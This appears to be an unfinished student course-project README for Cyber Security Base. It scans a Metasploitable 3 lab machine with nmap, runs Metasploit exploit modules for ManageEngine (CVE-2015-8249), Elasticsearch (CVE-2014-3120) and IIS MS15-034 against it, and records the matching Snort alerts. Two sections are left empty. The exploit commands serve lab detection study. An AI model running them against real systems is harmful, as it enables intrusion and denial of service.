# Cyber Security Base - Course Project II
[https://cybersecuritybase.github.io](https://cybersecuritybase.github.io)

## Setup
* [Kali Linux](https://www.kali.org/)
* [Metasploitable 3](https://github.com/rapid7/metasploitable3) with its requirements
* [Snort](https://www.snort.org/) installed on the Kali
* [Metasploit Community](https://www.rapid7.com/products/metasploit/download/)

## Initial scan
Target ip in all cases: 172.28.128.3.
### Using Metasploit Framework
Command: `nmap -v -sV 172.28.128.3 -oA subnet_1`
#### Results
     Nmap scan report for 172.28.128.3
     Host is up (0.00022s latency).
     Not shown: 989 filtered ports
     PORT      STATE SERVICE  VERSION
     21/tcp    open  ftp      Microsoft ftpd
     22/tcp    open  ssh      OpenSSH 7.1 (protocol 2.0)
     80/tcp    open  http     Microsoft IIS httpd 7.5
     3000/tcp  open  http     WEBrick httpd 1.3.1 (Ruby 2.3.1 (2016-04-26))
     4848/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
     8022/tcp  open  http     Apache Tomcat/Coyote JSP engine 1.1
     8080/tcp  open  http     Sun GlassFish Open Source Edition  4.0
     8383/tcp  open  ssl/http Apache httpd
     9200/tcp  open  http     Elasticsearch REST API 1.1.1 (name: Fantastic Four; Lucene 4.7)
     49153/tcp open  msrpc    Microsoft Windows RPC
     49154/tcp open  msrpc    Microsoft Windows RPC
     MAC Address: 08:00:27:B3:15:40 (Oracle VirtualBox virtual NIC)
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## Three attacks that Snort identifies
### ManageEngine - CVE-2015-8249
#### Commands in the msf
     use exploit/windows/http/manageengine_connectionid_write
     set rhost 172.28.128.3
     exploit

#### Results in the Snort alert log
##### SID 34716 enabled
     [**] [1:34716:3] SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [**]
     [Classification: Web Application Attack] [Priority: 1] 
     04/09-18:44:37.158501 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x4422
     172.28.128.1:38083 -> 172.28.128.3:8020 TCP TTL:128 TOS:0x0 ID:9200 IpLen:20 DgmLen:17428 DF
     ***A**** Seq: 0xA630394  Ack: 0xFDB044A7  Win: 0xE200  TcpLen: 32
     [Xref => http://osvdb.org/show/osvdb/121816][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-8249]

### ElasticSearch - CVE-2014-3120
#### Commands in the msf
     use exploit/multi/elasticsearch/script_mvel_rce
     set rhost 172.28.128.3
     exploit
    
#### Results in the Snort alert log
##### SIDs 36256 and 33830 enabled
     [**] [1:36256:1] SERVER-OTHER ElasticSearch information disclosure attempt [**]
     [Classification: Potential Corporate Privacy Violation] [Priority: 1] 
     04/09-19:49:07.741894 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x189
     172.28.128.1:46517 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:10371 IpLen:20 DgmLen:379 DF
     ***AP*** Seq: 0x7871FD5A  Ack: 0x603FC539  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9491928 1410943 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]


     [**] [1:36256:1] SERVER-OTHER ElasticSearch information disclosure attempt [**]
     [Classification: Potential Corporate Privacy Violation] [Priority: 1] 
     04/09-19:49:08.669252 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x181
     172.28.128.1:46523 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:22709 IpLen:20 DgmLen:371 DF
     ***AP*** Seq: 0xEBB68E74  Ack: 0x5E61650E  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9492160 1411036 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]

     [**] [1:36256:1] SERVER-OTHER ElasticSearch information disclosure attempt [**]
     [Classification: Potential Corporate Privacy Violation] [Priority: 1] 
     04/09-19:49:08.697926 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x189
     172.28.128.1:45915 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:42194 IpLen:20 DgmLen:379 DF
     ***AP*** Seq: 0xDF957218  Ack: 0x7B51DA0A  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9492167 1411039 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]

     [**] [1:33830:2] SERVER-OTHER ElasticSearch script remote code execution attempt [**]
     [Classification: Attempted User Privilege Gain] [Priority: 1] 
     04/09-19:49:08.721584 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0x5EA
     172.28.128.1:33297 -> 172.28.128.3:9200 TCP TTL:64 TOS:0x0 ID:54254 IpLen:20 DgmLen:1500 DF
     ***A**** Seq: 0x2AAC0522  Ack: 0x9E85494E  Win: 0xE5  TcpLen: 32
     TCP Options (3) => NOP NOP TS: 9492173 1411042 
     [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]

### IIS - HTTP - CVE-2015-1635
#### Commands in the msf
     use auxiliary/dos/http/ms15_034_ulonglongadd
     set rhost 172.28.128.3
     exploit

#### Results in the Snort alert log
##### SID 34061 enabled
     [**] [1:34061:3] SERVER-IIS Microsoft IIS Range header integer overflow attempt [**]
     [Classification: Attempted Denial of Service] [Priority: 2] 
     04/09-22:05:31.382374 0A:00:27:00:00:00 -> 08:00:27:B3:15:40 type:0x800 len:0xD8
     172.28.128.1:36419 -> 172.28.128.3:80 TCP TTL:128 TOS:0x0 ID:1364 IpLen:20 DgmLen:202 DF
     ***AP*** Seq: 0x7EEE4D57  Ack: 0x1FAA7483  Win: 0x400  TcpLen: 32
     [Xref => http://technet.microsoft.com/en-us/security/bulletin/ms15-034][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-1635][Xref => http://www.securityfocus.com/bid/74013]

## Two attacks that Snort doesn't identify
### 1
### 2

## Is it easier to fix the application than to detect attacks?